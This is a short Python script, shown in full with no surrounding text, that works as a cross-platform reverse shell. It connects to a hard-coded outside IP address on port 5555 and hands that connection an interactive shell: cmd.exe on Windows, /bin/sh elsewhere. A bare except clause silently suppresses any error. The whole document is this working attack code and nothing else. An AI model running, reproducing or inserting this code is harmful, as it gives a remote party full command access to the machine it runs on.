try:
    import socket, subprocess, os, platform
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("47.116.205.76", 5555))
    if platform.system() == "Windows":
        subprocess.Popen(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    else:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
except:
    pass
